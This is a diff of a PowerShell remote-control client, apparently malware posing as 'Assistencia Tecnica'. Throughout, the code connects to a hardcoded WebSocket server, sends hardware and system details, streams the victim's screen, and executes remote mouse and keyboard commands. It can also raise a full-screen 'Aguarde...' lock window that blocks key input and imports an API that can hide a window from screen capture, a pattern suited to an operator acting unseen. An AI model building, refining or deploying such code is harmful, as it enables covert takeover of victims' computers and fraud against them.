@@ -1,46 +1,187 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$code = @"
+$inputSimulator = @"
 using System;
 using System.Runtime.InteropServices;
 
-public class WinAPI {
-    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
-    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
-    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
-    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
-    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
-    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
-    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);
-    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+public class InputSimulator {
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);
+
+    [DllImport("user32.dll")]
+    private static extern int GetSystemMetrics(int nIndex);
+
+    [DllImport("user32.dll")]
+    private static extern bool SetCursorPos(int X, int Y);
+
+    [DllImport("user32.dll")]
+    private static extern bool GetCursorPos(out POINT lpPoint);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool SetConsoleTitleW(string title);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct POINT { public int X; public int Y; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct INPUT {
+        public uint type;
+        public MOUSEKEYBDINPUT mkhi;
+    }
+
+    [StructLayout(LayoutKind.Explicit)]
+    private struct MOUSEKEYBDINPUT {
+        [FieldOffset(0)] public MOUSEINPUT mi;
+        [FieldOffset(0)] public KEYBDINPUT ki;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct MOUSEINPUT {
+        public int dx;
+        public int dy;
+        public uint mouseData;
+        public uint dwFlags;
+        public uint time;
+        public IntPtr dwExtraInfo;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct KEYBDINPUT {
+        public ushort wVk;
+        public ushort wScan;
+        public uint dwFlags;
+        public uint time;
+        public IntPtr dwExtraInfo;
+    }
+
+    private const uint INPUT_MOUSE = 0;
+    private const uint INPUT_KEYBOARD = 1;
+
+    private const uint MOUSEEVENTF_MOVE = 0x0001;
+    private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
+    private const uint MOUSEEVENTF_LEFTUP = 0x0004;
+    private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
+    private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
+    private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
+    private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
+    private const uint MOUSEEVENTF_WHEEL = 0x0800;
+    private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
+
+    private const uint KEYEVENTF_KEYUP = 0x0002;
+
+    public static int ScreenWidth { get { return GetSystemMetrics(0); } }
+    public static int ScreenHeight { get { return GetSystemMetrics(1); } }
+
+    public static void MoveMouse(int x, int y) {
+        SetCursorPos(x, y);
+    }
+
+    public static void MouseClick(int x, int y, string button, int clicks) {
+        SetCursorPos(x, y);
+        System.Threading.Thread.Sleep(10);
+
+        uint downFlag, upFlag;
+        switch (button) {
+            case "right":
+                downFlag = MOUSEEVENTF_RIGHTDOWN;
+                upFlag = MOUSEEVENTF_RIGHTUP;
+                break;
+            case "middle":
+                downFlag = MOUSEEVENTF_MIDDLEDOWN;
+                upFlag = MOUSEEVENTF_MIDDLEUP;
+                break;
+            default:
+                downFlag = MOUSEEVENTF_LEFTDOWN;
+                upFlag = MOUSEEVENTF_LEFTUP;
+                break;
+        }
+
+        for (int i = 0; i < clicks; i++) {
+            INPUT[] inputs = new INPUT[2];
+
+            inputs[0].type = INPUT_MOUSE;
+            inputs[0].mkhi.mi.dwFlags = downFlag;
+
+            inputs[1].type = INPUT_MOUSE;
+            inputs[1].mkhi.mi.dwFlags = upFlag;
+
+            SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
+            System.Threading.Thread.Sleep(10);
+        }
+    }
+
+    public static void MouseScroll(int delta) {
+        INPUT[] inputs = new INPUT[1];
+        inputs[0].type = INPUT_MOUSE;
+        inputs[0].mkhi.mi.dwFlags = MOUSEEVENTF_WHEEL;
+        inputs[0].mkhi.mi.mouseData = (uint)(delta * 120);
+        SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
+    }
+
+    public static void KeyPress(ushort vk) {
+        INPUT[] inputs = new INPUT[2];
+
+        inputs[0].type = INPUT_KEYBOARD;
+        inputs[0].mkhi.ki.wVk = vk;
+        inputs[0].mkhi.ki.dwFlags = 0;
+
+        inputs[1].type = INPUT_KEYBOARD;
+        inputs[1].mkhi.ki.wVk = vk;
+        inputs[1].mkhi.ki.dwFlags = KEYEVENTF_KEYUP;
+
+        SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
+    }
+
+    public static void KeyDown(ushort vk) {
+        INPUT[] inputs = new INPUT[1];
+        inputs[0].type = INPUT_KEYBOARD;
+        inputs[0].mkhi.ki.wVk = vk;
+        inputs[0].mkhi.ki.dwFlags = 0;
+        SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
+    }
+
+    public static void KeyUp(ushort vk) {
+        INPUT[] inputs = new INPUT[1];
+        inputs[0].type = INPUT_KEYBOARD;
+        inputs[0].mkhi.ki.wVk = vk;
+        inputs[0].mkhi.ki.dwFlags = KEYEVENTF_KEYUP;
+        SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
+    }
+}
+"@
+Add-Type -TypeDefinition $inputSimulator
+
+$lockWinCode = @"
+using System;
+using System.Runtime.InteropServices;
+public class LockWin {
     [DllImport("user32.dll")] public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
     [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
     [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
     [DllImport("user32.dll")] public static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);
-    [DllImport("kernel32.dll")] public static extern bool SetConsoleTitleW(string title);
-
-    public const uint MOUSEEVENTF_LEFTDOWN = 0x02;
-    public const uint MOUSEEVENTF_LEFTUP = 0x04;
-    public const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
-    public const uint MOUSEEVENTF_RIGHTUP = 0x10;
-    public const uint MOUSEEVENTF_MIDDLEDOWN = 0x20;
-    public const uint MOUSEEVENTF_MIDDLEUP = 0x40;
-    public const uint MOUSEEVENTF_WHEEL = 0x800;
-    public const uint KEYEVENTF_KEYUP = 0x02;
 }
 "@
-Add-Type -TypeDefinition $code
 
 $Global:SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
 $Global:clientId = $null
-$Global:ws = $null
 $Global:running = $true
 $Global:panelConnected = $false
 $Global:screenLocked = $false
-$Global:lockForm = $null
+$Global:lockJob = $null
 $Global:scale = 0.75
 $Global:quality = 70
+
+$Global:keyMap = @{
+    'Enter' = 0x0D; 'Backspace' = 0x08; 'Tab' = 0x09; 'Escape' = 0x1B; 'Space' = 0x20
+    'ArrowUp' = 0x26; 'ArrowDown' = 0x28; 'ArrowLeft' = 0x25; 'ArrowRight' = 0x27
+    'Delete' = 0x2E; 'Home' = 0x24; 'End' = 0x23; 'PageUp' = 0x21; 'PageDown' = 0x22
+    'Insert' = 0x2D; 'CapsLock' = 0x14; 'NumLock' = 0x90; 'ScrollLock' = 0x91
+    ' ' = 0x20
+    'F1' = 0x70; 'F2' = 0x71; 'F3' = 0x72; 'F4' = 0x73; 'F5' = 0x74; 'F6' = 0x75
+    'F7' = 0x76; 'F8' = 0x77; 'F9' = 0x78; 'F10' = 0x79; 'F11' = 0x7A; 'F12' = 0x7B
+    'Control' = 0x11; 'Alt' = 0x12; 'Shift' = 0x10; 'Meta' = 0x5B
+}
 
 function Get-HWID {
     try {
@@ -63,8 +204,8 @@ function Get-SystemInfo {
 }
 
 function Capture-Screen {
-    $width = [WinAPI]::GetSystemMetrics(0)
-    $height = [WinAPI]::GetSystemMetrics(1)
+    $width = [InputSimulator]::ScreenWidth
+    $height = [InputSimulator]::ScreenHeight
     $scaledW = [int]($width * $Global:scale)
     $scaledH = [int]($height * $Global:scale)
 
@@ -96,81 +237,57 @@ function Capture-Screen {
 function Move-MouseTo($x, $y) {
     $realX = [int]($x / $Global:scale)
     $realY = [int]($y / $Global:scale)
-    $result = [WinAPI]::SetCursorPos($realX, $realY)
-    Write-Host "  [Mouse] Move: input($x,$y) -> real($realX,$realY) scale=$($Global:scale) result=$result"
+    [InputSimulator]::MoveMouse($realX, $realY)
 }
 
 function Click-Mouse($x, $y, $button, $clicks) {
-    Move-MouseTo $x $y
-    Start-Sleep -Milliseconds 10
-
-    for ($i = 0; $i -lt $clicks; $i++) {
-        switch ($button) {
-            "right" {
-                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
-                Start-Sleep -Milliseconds 10
-                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
-            }
-            "middle" {
-                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0)
-                Start-Sleep -Milliseconds 10
-                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0)
-            }
-            default {
-                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
-                Start-Sleep -Milliseconds 10
-                [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
-            }
-        }
-        Start-Sleep -Milliseconds 10
-    }
+    $realX = [int]($x / $Global:scale)
+    $realY = [int]($y / $Global:scale)
+    Write-Host "  [Click] ($realX, $realY) btn=$button clicks=$clicks"
+    [InputSimulator]::MouseClick($realX, $realY, $button, $clicks)
 }
 
 function Scroll-Mouse($delta) {
-    [void][WinAPI]::mouse_event([WinAPI]::MOUSEEVENTF_WHEEL, 0, 0, [int]($delta * 120), 0)
+    [InputSimulator]::MouseScroll($delta)
+}
+
+function Get-VirtualKey($key) {
+    if ($Global:keyMap.ContainsKey($key)) {
+        return $Global:keyMap[$key]
+    } elseif ($key.Length -eq 1) {
+        return [int][char]$key.ToUpper()
+    }
+    return 0
 }
 
 function Press-Key($key) {
-    $keyMap = @{
-        'Enter' = 0x0D; 'Backspace' = 0x08; 'Tab' = 0x09; 'Escape' = 0x1B
-        'ArrowUp' = 0x26; 'ArrowDown' = 0x28; 'ArrowLeft' = 0x25; 'ArrowRight' = 0x27
-        'Delete' = 0x2E; 'Home' = 0x24; 'End' = 0x23; 'PageUp' = 0x21; 'PageDown' = 0x22
-        ' ' = 0x20; 'F1' = 0x70; 'F2' = 0x71; 'F3' = 0x72; 'F4' = 0x73
-        'F5' = 0x74; 'F6' = 0x75; 'F7' = 0x76; 'F8' = 0x77
-        'F9' = 0x78; 'F10' = 0x79; 'F11' = 0x7A; 'F12' = 0x7B
+    $vk = Get-VirtualKey $key
+    if ($vk -gt 0) {
+        Write-Host "  [Key] $key -> VK=$vk"
+        [InputSimulator]::KeyPress([uint16]$vk)
     }
-
-    if ($keyMap.ContainsKey($key)) {
-        $vk = $keyMap[$key]
-    } elseif ($key.Length -eq 1) {
-        $vk = [int][char]$key.ToUpper()
-    } else {
-        return
-    }
-
-    [void][WinAPI]::keybd_event($vk, 0, 0, 0)
-    Start-Sleep -Milliseconds 10
-    [void][WinAPI]::keybd_event($vk, 0, [WinAPI]::KEYEVENTF_KEYUP, 0)
 }
 
 function Press-KeyCombo($keys) {
-    $modMap = @{ 'Control' = 0x11; 'Alt' = 0x12; 'Shift' = 0x10; 'Meta' = 0x5B }
-    $keyMap = @{
-        'Enter' = 0x0D; 'Backspace' = 0x08; 'Tab' = 0x09; 'Escape' = 0x1B
-        'ArrowUp' = 0x26; 'ArrowDown' = 0x28; 'ArrowLeft' = 0x25; 'ArrowRight' = 0x27
-        'Delete' = 0x2E; ' ' = 0x20
-    }
-
     $vks = @()
     foreach ($k in $keys) {
-        if ($modMap.ContainsKey($k)) { $vks += $modMap[$k] }
-        elseif ($keyMap.ContainsKey($k)) { $vks += $keyMap[$k] }
-        elseif ($k.Length -eq 1) { $vks += [int][char]$k.ToUpper() }
+        $vk = Get-VirtualKey $k
+        if ($vk -gt 0) { $vks += $vk }
     }
 
-    foreach ($vk in $vks) { [void][WinAPI]::keybd_event($vk, 0, 0, 0) }
+    Write-Host "  [Combo] $($keys -join '+') -> VKs=$($vks -join ',')"
+
+    foreach ($vk in $vks) {
+        [InputSimulator]::KeyDown([uint16]$vk)
+        Start-Sleep -Milliseconds 20
+    }
+
     Start-Sleep -Milliseconds 50
-    for ($i = $vks.Count - 1; $i -ge 0; $i--) { [void][WinAPI]::keybd_event($vks[$i], 0, [WinAPI]::KEYEVENTF_KEYUP, 0) }
+
+    for ($i = $vks.Count - 1; $i -ge 0; $i--) {
+        [InputSimulator]::KeyUp([uint16]$vks[$i])
+        Start-Sleep -Milliseconds 20
+    }
 }
 
 function Show-LockScreen($message) {
@@ -178,19 +295,10 @@ function Show-LockScreen($message) {
     $Global:screenLocked = $true
 
     $job = Start-Job -ScriptBlock {
-        param($msg)
+        param($msg, $lockCode)
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
-        Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class LockWin {
-    [DllImport("user32.dll")] public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
-    [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
-    [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
-    [DllImport("user32.dll")] public static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);
-}
-"@
+        Add-Type -TypeDefinition $lockCode
 
         $form = New-Object System.Windows.Forms.Form
         $form.Text = ""
@@ -238,12 +346,11 @@ public class LockWin {
         $form.Controls.Add($label1)
         $form.Controls.Add($label2)
         $form.Controls.Add($label3)
-
         $form.Add_KeyDown({ $_.Handled = $true })
         $form.Add_KeyPress({ $_.Handled = $true })
 
         [System.Windows.Forms.Application]::Run($form)
-    } -ArgumentList $message
+    } -ArgumentList $message, $lockWinCode
 
     $Global:lockJob = $job
 }
@@ -258,7 +365,7 @@ function Hide-LockScreen {
 }
 
 function Start-Client {
-    $null = [WinAPI]::SetConsoleTitleW("Assistencia Tecnica")
+    [InputSimulator]::SetConsoleTitleW("Assistencia Tecnica")
 
     while ($Global:running) {
         try {
@@ -272,7 +379,7 @@ function Start-Client {
             $bytes = [System.Text.Encoding]::UTF8.GetBytes($register)
             $segment = [System.ArraySegment[byte]]::new($bytes)
             $null = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
-            Write-Host "  Registro enviado, estado: $($ws.State)"
+            Write-Host "  Registro enviado"
 
             $buffer = [byte[]]::new(65536)
             $frameTimer = [System.Diagnostics.Stopwatch]::StartNew()
@@ -280,19 +387,16 @@ function Start-Client {
             $recvTask = $null
 
             while ($Global:running) {
-                # Check WebSocket state
                 if ($ws.State.ToString() -ne 'Open') {
                     Write-Host "  WebSocket fechado: $($ws.State)"
                     break
                 }
 
-                # Start receive task if not running
                 if ($recvTask -eq $null) {
                     $segment = [System.ArraySegment[byte]]::new($buffer)
                     $recvTask = $ws.ReceiveAsync($segment, [System.Threading.CancellationToken]::None)
                 }
 
-                # Check if receive completed
                 if ($recvTask.IsCompleted) {
                     try {
                         $result = $recvTask.Result
@@ -322,27 +426,30 @@ function Start-Client {
                                     Write-Host "  Painel desconectado"
                                 }
                                 "mouse-move" {
-                                    Write-Host "  [Recv] mouse-move: x=$($msg.x) y=$($msg.y)"
                                     Move-MouseTo $msg.x $msg.y
                                 }
                                 "mouse-click" {
-                                    Write-Host "  Click: $($msg.x),$($msg.y) btn=$($msg.button)"
                                     Click-Mouse $msg.x $msg.y $msg.button $(if ($msg.clicks) { $msg.clicks } else { 1 })
                                 }
-                                "mouse-scroll" { Scroll-Mouse $msg.delta }
+                                "mouse-scroll" {
+                                    Scroll-Mouse $msg.delta
+                                }
                                 "key-press" {
-                                    Write-Host "  [Recv] key-press: key=$($msg.key)"
                                     Press-Key $msg.key
                                 }
                                 "key-combination" {
-                                    Write-Host "  [Recv] key-combo: keys=$($msg.keys -join '+')"
                                     Press-KeyCombo $msg.keys
                                 }
-                                "lock-screen" { Show-LockScreen $(if ($msg.message) { $msg.message } else { "Aguarde..." }) }
-                                "unlock-screen" { Hide-LockScreen }
+                                "lock-screen" {
+                                    Show-LockScreen $(if ($msg.message) { $msg.message } else { "Aguarde..." })
+                                }
+                                "unlock-screen" {
+                                    Hide-LockScreen
+                                }
                                 "set-quality" {
                                     $Global:quality = if ($msg.quality) { $msg.quality } else { 70 }
                                     $Global:scale = if ($msg.scale) { $msg.scale } else { 0.75 }
+                                    Write-Host "  Qualidade: $($Global:quality)% Escala: $($Global:scale)"
                                 }
                                 "disconnect-client" {
                                     Hide-LockScreen
@@ -351,12 +458,11 @@ function Start-Client {
                             }
                         }
                     } catch {
-                        Write-Host "  Erro recebendo: $($_.Exception.Message)"
+                        Write-Host "  Erro: $($_.Exception.Message)"
                         break
                     }
                 }
 
-                # Send frames (100ms = 10 FPS)
                 if ($Global:panelConnected -and $frameTimer.ElapsedMilliseconds -ge 100) {
                     $frameTimer.Restart()
                     try {
@@ -373,12 +479,11 @@ function Start-Client {
                         $seg = [System.ArraySegment[byte]]::new($bytes)
                         $null = $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
                     } catch {
-                        Write-Host "  Erro enviando frame: $($_.Exception.Message)"
+                        Write-Host "  Erro frame: $($_.Exception.Message)"
                         break
                     }
                 }
 
-                # Keep-alive ping every 15 seconds
                 if ($pingTimer.ElapsedMilliseconds -ge 15000) {
                     $pingTimer.Restart()
                     try {
@@ -395,9 +500,6 @@ function Start-Client {
             $ws.Dispose()
         } catch {
             Write-Host "  Erro: $($_.Exception.Message)"
-            if ($_.Exception.InnerException) {
-                Write-Host "  Inner: $($_.Exception.InnerException.Message)"
-            }
             Write-Host "  Reconectando em 5s..."
             Start-Sleep -Seconds 5
         }
